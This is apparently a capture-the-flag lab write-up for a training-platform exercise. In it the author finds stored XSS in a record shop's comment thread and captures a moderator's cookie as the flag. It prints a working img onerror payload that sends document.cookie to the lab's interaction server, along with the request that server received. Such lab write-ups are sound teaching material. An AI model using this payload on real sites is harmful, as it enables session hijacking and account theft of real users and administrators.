---

Name: Crate & Sleeve
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/07/inscription
Description: Crate & Sleeve has run since 2014 on volunteer hosting and member dues, no auction bots, no eBay scraping, no premium tier. About four hundred records in rotation, a handful of moderators who scan the latest comments on their lunch break, and a codebase a college friend wrote one summer and never came back to. The comment thread is where regulars haggle over pressing variants and condition grades, it's also the part of the site the moderators trust their members on the most. 

---

## Finding the Vulnerability

I started by testing the comment section for HTML and JavaScript injection.

A simple XSS payload worked:

```html
<script>alert("Hacked")</script>
```

The JavaScript executed when the comment was viewed, confirming that the comment section was vulnerable to **Stored Cross-Site Scripting (XSS)**.

Because comments are viewed by moderators, I suspected that the vulnerability could be used to execute JavaScript in an administrator's browser.

## Stealing the Cookie

The lab provides an Interact Server that can be used to receive HTTP requests.

I created an XSS payload that sends the victim's cookies to my Interact Server:

```html
<img src=x onerror=this.src='http://65a4184f-5330-inscription-7137e.interact.webverselabs-pro.com/?c='+document.cookie>
```

I submitted the payload as a comment and waited for the administrator to view the page.

The Interact Server received a request:

```text
host: 65a4184f-5330-inscription-7137e.interact.webverselabs-pro.com
user-agent: python-requests/2.32.3
accept-encoding: gzip, deflate
accept: */*
connection: keep-alive
```

The request contained the administrator's cookie:

```text
c=WEBVERSE{REDACTED}
```

The cookie value was the flag.
